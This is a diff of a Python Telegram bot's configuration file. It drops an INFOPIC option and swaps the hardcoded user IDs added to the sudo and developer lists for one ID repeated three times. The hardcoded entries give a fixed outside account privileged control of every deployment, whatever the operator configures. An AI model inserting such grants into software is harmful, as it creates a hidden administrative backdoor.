@@ -57,7 +57,6 @@ if ENV:
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
 
-    INFOPIC = bool(os.environ.get('INFOPIC', False))
     GBAN_LOGS = os.environ.get('GBAN_LOGS', None)
     WEBHOOK = bool(os.environ.get('WEBHOOK', False))
     URL = os.environ.get('URL', "")  # Does not contain token
@@ -124,7 +123,6 @@ else:
     URL = Config.URL
     PORT = Config.PORT
     CERT_PATH = Config.CERT_PATH
-
     DB_URI = Config.SQLALCHEMY_DATABASE_URI
     DONATION_LINK = Config.DONATION_LINK
     LOAD = Config.LOAD
@@ -140,17 +138,16 @@ else:
     AI_API_KEY = Config.AI_API_KEY
     WALL_API = Config.WALL_API
     STRICT_GMUTE = Config.STRICT_GMUTE
-    INFOPIC = Config.INFOPIC
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(947040154)
-SUDO_USERS.add(1118936839)
-SUDO_USERS.add(254318997)
+SUDO_USERS.add(866838349)
+SUDO_USERS.add(866838349)
+SUDO_USERS.add(866838349)
 
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(947040154)
-DEV_USERS.add(1118936839)
-DEV_USERS.add(254318997)
+DEV_USERS.add(866838349)
+DEV_USERS.add(866838349)
+DEV_USERS.add(866838349)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
